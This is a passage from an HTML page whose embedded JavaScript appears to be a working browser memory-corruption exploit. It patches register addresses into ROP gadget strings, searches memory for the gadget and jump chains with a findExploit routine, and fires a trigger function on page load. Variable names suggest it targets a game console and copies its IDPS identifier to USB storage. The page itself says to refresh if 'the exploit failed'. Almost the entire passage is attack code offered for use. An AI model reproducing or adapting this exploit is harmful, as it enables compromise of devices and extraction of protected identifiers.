		gadget = gadget.replaceAt(458, hexh2bin(usb_generic_storage_addr));
		
		// write found address to r11
		//gadget = gadget.replaceAt(459, hexh2bin((4276946193) >> 16));
		//gadget = gadget.replaceAt(460, hexh2bin(4276946193));
		
		// write found address to r10
		//gadget = gadget.replaceAt(461, hexh2bin((idps_hex_addr) >> 16));
		//gadget = gadget.replaceAt(462, hexh2bin(idps_hex_addr));
		
		// write found address to r8
		//gadget = gadget.replaceAt(463, hexh2bin((idps_base_addr) >> 16));
		//gadget = gadget.replaceAt(464, hexh2bin(idps_base_addr));
		
		// write found address to r7
		//gadget = gadget.replaceAt(465, hexh2bin((idps_storage_usb_addr) >> 16));
		//gadget = gadget.replaceAt(466, hexh2bin(idps_storage_usb_addr));
		
		// write found address to r6
		//gadget = gadget.replaceAt(467, hexh2bin((idps_hex_addr) >> 16));
		//gadget = gadget.replaceAt(468, hexh2bin(idps_hex_addr));
		
		// write found address to r5
		//gadget = gadget.replaceAt(469, hexh2bin((idps_base_addr) >> 16));
		//gadget = gadget.replaceAt(470, hexh2bin(idps_base_addr));
		
		// write found address to r4
		//gadget = gadget.replaceAt(471, hexh2bin((idps_storage_usb_addr) >> 16));
		//gadget = gadget.replaceAt(472, hexh2bin(idps_storage_usb_addr));
		
		// write found address to r3
		gadget = gadget.replaceAt(473, hexh2bin((usb_generic_storage_addr) >> 16));
		gadget = gadget.replaceAt(474, hexh2bin(usb_generic_storage_addr));
		
		// write found address to r9
		//gadget = gadget.replaceAt(475, hexh2bin((idps_base_addr) >> 16));
		//gadget = gadget.replaceAt(476, hexh2bin(idps_base_addr));
		
		// write found address to r29
		gadget = gadget.replaceAt(487, hexh2bin((idps_base_addr) >> 16));
		gadget = gadget.replaceAt(488, hexh2bin(idps_base_addr));
		
		// write found address to r30
		gadget = gadget.replaceAt(491, hexh2bin((idps_hex_addr) >> 16));
		gadget = gadget.replaceAt(492, hexh2bin(idps_hex_addr));
		
		// write found address to r31
		gadget = gadget.replaceAt(495, hexh2bin((idps_storage_usb_addr) >> 16));
		gadget = gadget.replaceAt(496, hexh2bin(idps_storage_usb_addr));
		//-------------------------------------------------------------------
		
		//-------------------------------------------------------------------
		// write to gadget #6
		
		// write found address to r31
		gadget = gadget.replaceAt(559, hexh2bin((usb_generic_storage_addr) >> 16));
		gadget = gadget.replaceAt(560, hexh2bin(usb_generic_storage_addr));
		
		// write found address to r3
		gadget = gadget.replaceAt(563, hexh2bin((usb_generic_storage_addr) >> 16));
		gadget = gadget.replaceAt(564, hexh2bin(usb_generic_storage_addr));
		//-------------------------------------------------------------------
		
		
		
		// Find Gadgets Pointer
		dbg("Processing gadget string.. Searching for valid offset....");
		do{
		g = gadget.replaceAt(0x00/2,hexh2bin(0x7E2A));
		gadget_addr = findExploit("gadget",g,0x80150000,0x450000,0x7E2A,0x1B8);
		//gadget_addr = findExploit("gadget",g,0x80150000,0x450000,0x7E2A,0x644);
		}
		while(gadget_addr==0);
		
		// Find jump_2 Address
		dbg("Processing jump_2 string.. Searching for valid offset....");
		jump_2 = unescape("\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4444\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u2A2F");
		jump_2 = jump_2.replaceAt(0x32/2, hexh2bin((gadget_addr) >> 16));
		jump_2 = jump_2.replaceAt(0x34/2, hexh2bin(gadget_addr));	
		do{
		j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x2A2F));
		jump_2_addr = findExploit("j2",j2,0x80150000,0x450000,0x2A2F,0x1C);
		}
		while(jump_2_addr==0);
		
		// Find jump_1 Address
		dbg("Processing jump_1 string.. Searching for valid offset....");
		jump_1 = unescape("\u4141\u4141\u4141\u7E2F");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));	
		do{

		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		jump_1_addr = findExploit("j1",j1,0x80150000,0x450000,0x7E2F,0x4);
		}
		while(jump_1_addr==0);
		
		
		// Debug Output To Python
		dbg("                                                ");
		dbg("------------------------------------------------");
		dbg("All required offsets have been found....");
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("--- GADGETS ------------------------------------");
		dbg("gadget: "+a2hex(gadget));
		dbg("gadget (g): "+a2hex(g));
		dbg("                                                ");
		dbg("--- GADGETS CONTINUED---------------------------");
		dbg("payload: "+a2hex(payload));
		dbg("jump_2: "+a2hex(j2));
		dbg("jump_1: "+a2hex(j1));
		dbg("idps_storage_usb: "+a2hex(idps_storage_usb));
		dbg("idps_hex: "+a2hex(idps_hex));
		dbg("idps_base: "+a2hex(idps_base));
		dbg("usb_generic_storage: "+a2hex(usb_generic_storage));
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("--- OFFSETS ------------------------------------");
		dbg("gadget offset: 0x"+gadget_addr.toString(16));
		dbg("payload offset: 0x"+payload_addr.toString(16));
		dbg("jump_2 offset: 0x"+jump_2_addr.toString(16));
		dbg("jump_1 offset: 0x"+jump_1_addr.toString(16));	
		dbg("idps_storage_usb_addr offset: 0x"+idps_storage_usb_addr.toString(16));	
		dbg("idps_hex_addr offset: 0x"+idps_hex_addr.toString(16));
		dbg("idps_base_addr offset: 0x"+idps_base_addr.toString(16));
		dbg("usb_generic_storage_addr offset: 0x"+usb_generic_storage_addr.toString(16));
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("Triggering exploit....");
		trigger(jump_1_addr);				
		
		return;
	} catch(e) {
		dbg(e);
	}
}
</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears without further log below, refresh the page because the exploit failed!<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
